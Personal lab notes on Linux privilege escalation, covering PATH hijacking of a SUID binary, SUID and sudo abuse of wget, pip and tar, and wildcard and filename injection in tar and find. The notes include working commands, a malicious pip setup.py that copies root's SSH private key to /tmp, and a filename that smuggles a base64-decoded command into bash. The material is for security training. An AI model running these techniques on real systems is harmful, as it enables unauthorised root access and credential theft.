# path hijacking
## What is the path?
```bash
echo $PATH
# ans
/home/edibauer/.nvm/versions/node/v25.2.1/bin:/home/edibauer/.local/bin:/home/edibauer/.local/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/edibauer/.dotnet/tools

# CREATING A READER FILE
#+ begin reader.c
// Compile with:
// gcc reader.c -o reader

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

char *VALID_FILES[] = { "01.txt", "02.txt" };
int valid_files_count = 2;

int main(int argc, char**argv) {
    if (argc < 2) {
        fprintf(stderr, "[INFO] Usage %s <filename>\n", argv[0]);
        return -1;
    }

    char *user_filename = argv[1];

    for (int i = 0; i < valid_files_count; i++) {
        char *valid_filename = VALID_FILES[i];
        int length = strlen(valid_filename);

        if(!strncmp(user_filename, valid_filename, length)) {
            char cmd[42] = {0};
            sprintf(cmd, "cat ./archive/%s", user_filename);
            setuid(0);
            setgid(0);
            system(cmd);
            return 0;
        }
    }

    printf("[INFO] No file with such names were found.\n");
    return 0;

}
#+ end reader.c

gcc reader.c -o reader

# FILE PERMISSSIONS

drwxrwxr-x 2 root     root      4096 Mar 15 22:15 archive
-rwxrwxr-x 1 edibauer edibauer    28 Mar 15 22:22 cat
-rwsr-xr-x 1 root     root     16464 Mar 15 22:08 reader
-rw-rw-r-- 1 edibauer edibauer   863 Mar 15 22:04 reader.c

# CHANGING PATH
PATH=.:$PATH

# RUNNGIN BINARY
./reader 01.txt

┌──(root㉿kali)-[~/Desktop/hexdump/PRIVESC]
└─# whoami
root


```
# SUID
```bash
#+ begin script.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>

int main(int argc, char **argv) {
    uid_t uid = getuid(); // Real User ID
    uid_t eid = geteuid(); // Effective User ID 

    printf("[INFO] - Real User ID: %d\n", uid);
    printf("[INFO] - Effective user ID: %d\n", eid);

    execv("/usr/bin/touch", (char * []){"/usr/bin/touch", "hello", NULL});
    
    return 0;
}

#+ end script.c

# wget EXAMPLE
sudo install -m =xs $(which wget) .

TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh -p \n/bin/sh -p 1>&0' > $TF
./wget --use-askpass=$TF 0

# FIND SUID BINARIES
find / -perm -u=s -type f 2>/dev/null


```
# SUDO
```bash
# CREATING A DOCKER LAB
FROM ubuntu:latest

RUN apt-get update
RUN apt-get install sudo nano -y

RUN echo "ubuntu:test" | chpasswd

# RUN LAB
docker build -t sudo_lab .
docker run -dit --name sudo_lab --rm sudo_lab
docker exec -it sudo_lab /bin/bash

# SUDOERS
cat /etc/sudoers

# COMMAND
user host = (runas) command

# EXAMPLE
ubuntu ALL=(ALL) NOPASSWD: ALL
# MEANS:
# THe user ubuntu on any host may run any command as any user without passwd

# SPECIFICALLY
# The first ALL refers to hosts
# The second ALL to target users
# The last ALL to target commands
# The NOPASSWD is an extra option to not require any commands

# EX
## ALL
visudo
pepito  ALL=(pepito:pepito) NOPASSWD: ALL # put in sudoers file
sudo -u pepito python3 -c 'import pty; pty.spawn("/bin/bash")' # We can run any command like pepito

## PIP
gpasswd -d ubuntu sudo # quitar al usuario ubuntu del grupo sudo
ubuntu  ALL=(root) /usr/bin/pip install * # Adding ubuntu user to sudoers file

# fake_pip.py
#+begin fake_pip
from setuptools import setup
from setuptools.command.install import install
import os

	class Install(install):
		def run(self):
			install.run(self)
			os.system('whoami > /tmp/test')

setup(name='Test', version='0.0.1', license='MIT', zip_safe=False, cmdclass={'install': Install})
#+end fake_pip

sudo /usr/bin/pip install . --upgrade --force-reinstall --break-system-packages
cat /tmp/test
# ans
root

# STOLE SSH ID_RSA WITH FAKE PIP
apt-install openssh-server
ssh-keygen -t rsa

cd ~
cat .ssh/id_rsa # like root

su ubuntu
cat /root/.ssh/id_rsa
# ans
cat: /root/.ssh/id_rsa: Permission denied

# CHANGING SETUP.PY
#+begin stup.py
from setuptools import setup
from setuptools.command.install import install
import os

class Install(install):
	def run(self):
		install.run(self)
		os.system('cat /root/.ssh/id_rsa > /tmp/id_rsa')

setup(name='Test', version='0.0.1', license='MIT', zip_safe=False, cmdclass={'install': Install})
#+end sertup.py

sudo /usr/bin/pip install . --upgrade --force-reinstall --break-system-packages
ls /tmp
# ans
id_rsa  test

## TAR
# CHANGING SUDOERS FILE
ubuntu  ALL=(root) /usr/bin/tar -cvf *

# EXECUTING ONELINER
su ubuntu
sudo /usr/bin/tar -cvf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# BASE64
```
# WILDCARD EXPANSION EXPLOTATION
```bash
# ?
ls test?
test1:
test1.txt

test2:
test2.txt

test3:

# *
ls *.{png,jpg}
# ans
test2.png  test3.jpg
                    
ls *.???
# ans
test1.txt  test2.png  test3.jpg

# EX
## TAR FUNCTIONALITY
tar -cvf test.tar *

## CREATING SETUP
cd /tmp
echo "test1" > file1.txt && echo "test2" > file2.txt && echo "test3" > file3.txt
tar -cvf /tmp/scenario1.tar *

# ans
-rw-rw-r-- 1 edibauer edibauer     6 Mar 17 15:20 file1.txt
-rw-rw-r-- 1 edibauer edibauer     6 Mar 17 15:20 file2.txt
-rw-rw-r-- 1 edibauer edibauer     6 Mar 17 15:20 file3.txt
-rw-rw-r-- 1 edibauer edibauer 10240 Mar 17 15:21 scenario1.tar

# WE NEED TO EXPAND THE COMMAND
tar -cvf /tmp/scenario1.tar * == tar -cvf /tmp/scenario1.tar file1.txt file2.txt file3.txt
tar -cvf /tmp/scenario1.tar -tag1 -tag2 -tag3 file1.txt file2.txt file3.txt

#+begin shell.sh
echo "touch /tmp/hacked" > /tmp/shell.sh # creating a shell
#+end shell.sh

ls -l # in /tmp dir 
# ans
file1.txt  file2.txt  file3.txt  shell.sh

# WE NEED TO CREATE TWO FILES
echo "">"--checkpoint-action=exec=sh shell.sh"
echo "">"--checkpoint=1"

# ans
'--checkpoint=1'                         file1.txt   file3.txt
'--checkpoint-action=exec=sh shell.sh'   file2.txt   shell.sh

# RUNNING COMMAND
tar -cvf /tmp/scenario1.tar *

#ans
-rw-rw-r-- 1 edibauer edibauer     1 Mar 17 15:29 '--checkpoint=1'
-rw-rw-r-- 1 edibauer edibauer     1 Mar 17 15:29 '--checkpoint-action=exec=sh shell.sh'
-rw-rw-r-- 1 edibauer edibauer     6 Mar 17 15:20  file1.txt
-rw-rw-r-- 1 edibauer edibauer     6 Mar 17 15:20  file2.txt
-rw-rw-r-- 1 edibauer edibauer     6 Mar 17 15:20  file3.txt
-rw-rw-r-- 1 edibauer edibauer     0 Mar 17 15:31  hacked
-rw-rw-r-- 1 edibauer edibauer 10240 Mar 17 15:31  scenario1.tar
-rw-rw-r-- 1 edibauer edibauer    18 Mar 17 15:26  shell.sh

tar -cvf /tmp/scenario1.tar * == tar -cvf /tmp/scenario1.tar --checkpoint=1 --checkpoint-action=exec=sh shell.sh file1.txt file2.txt file3.txt #RCE

# FIND
# CREATING TBE SETUP
touch test1.txt test2.png test3.jpg test4.pdf test5.gif

# EXECUTING ONELINER
/usr/bin/find . -type f -not -regex '.*\.\(jpg\|png\|gif\)' -exec bash -c 'rm -f {}' \;
ls
# ans
test2.png  test3.jpg  test5.gif

# CREATING FILE
touch ./"file.exe; echo dG91Y2ggL3RtcC9oYWNrZWQK | base64 -d | bash"

# EXECUTING ONELINER
/usr/bin/find . -type f -not -regex '.*\.\(jpg\|png\|gif\)' -exec bash -c 'rm -f {}' \;

ls
# ans
'file.exe; echo dG91Y2ggL3RtcC9oYWNrZWQK | base64 -d | bash'   test3.jpg
 hacked                                                        test5.gif
 test2.png

# REVERSE SHELLS




```
